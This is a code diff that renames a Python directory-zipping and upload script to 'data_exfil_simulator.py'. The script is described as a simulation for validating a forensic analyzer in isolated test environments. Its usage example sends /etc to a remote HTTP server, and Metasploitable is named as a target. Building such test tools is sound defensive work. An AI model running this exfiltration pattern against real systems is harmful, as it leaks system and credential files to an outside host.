@@ -1,9 +1,13 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 """
-remote_collector.py - Collect, zip, and send forensic evidence to a central server.
+data_exfil_simulator.py - Simulate data exfiltration: zip a directory and send it to a remote server.
 Compatible with Python 2.4, 2.5, 2.6, 2.7 and Python 3.x.
 Tested on legacy targets (e.g. Metasploitable 2 / Ubuntu 8.04) and modern systems.
+
+This is a SIMULATION tool for isolated test environments only.
+It exercises the collect-zip-exfiltrate pattern so the forensic
+analyzer can be validated against realistic exfil artifacts.
 """
 
 import os
@@ -40,7 +44,7 @@ def create_zip_archive(target_dir, output_zip_path):
                     rel_path = filepath[len(target_dir):].lstrip('/\\')
                 else:
                     rel_path = filename
-                
+
                 try:
                     zf.write(filepath, rel_path)
                 except Exception:
@@ -57,14 +61,14 @@ def pack_and_send(target_dir, server_url):
         return False
 
     print("[*] Packing directory: %s" % (target_dir,))
-    
+
     temp_dir = tempfile.mkdtemp()
     archive_path = os.path.join(temp_dir, "evidence.zip")
-    
+
     try:
         create_zip_archive(target_dir, archive_path)
         print("[+] Successfully packed into %s" % (archive_path,))
-        
+
         file_size = os.path.getsize(archive_path)
         print("[*] Connecting to %s to send %d bytes..." % (server_url, file_size))
 
@@ -127,8 +131,8 @@ def pack_and_send(target_dir, server_url):
 
 
 def print_usage():
-    print("Usage: python remote_collector.py <target_dir> <server_url>")
-    print("Example: python remote_collector.py /etc http://192.168.1.10:8000/")
+    print("Usage: python data_exfil_simulator.py <target_dir> <server_url>")
+    print("Example: python data_exfil_simulator.py /etc http://192.168.1.10:8000/")
     print("")
     print("Note for Metasploitable / Legacy Linux:")
     print("  Run with 'python' (Python 2.5+), no external dependencies required.")
@@ -145,6 +149,5 @@ if __name__ == '__main__':
 
     target_dir = sys.argv[1]
     server_url = sys.argv[2]
-    
-    pack_and_send(target_dir, server_url)
 
+    pack_and_send(target_dir, server_url)
